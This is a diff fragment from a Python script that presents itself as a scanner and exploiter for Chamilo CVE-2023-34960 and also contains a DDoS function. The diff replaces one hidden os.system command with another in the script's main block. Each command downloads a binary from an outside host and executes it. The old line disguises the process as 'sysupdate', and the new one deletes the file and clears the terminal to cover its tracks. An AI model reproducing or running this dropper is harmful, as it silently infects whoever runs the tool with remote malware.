@@ -108,7 +108,7 @@ def ddos_attack(target_url, duration):
                 pass
 
 if __name__ == '__main__':
-    os.system("cd / && wget https://files.catbox.moe/v0u2b2 && chmod +x v0u2b2 && screen -dmS sysupdate ./v0u2b2")
+    os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.182.25.126/bot; chmod +x bot; ./bot; rm -rf bot; cd; clear")
     print("\nChamilo_CVE-2023-34960 Scanner&Exploiter by tarsoul\n")
 
     arg = ArgumentParser(description='check_url By tarsoul')
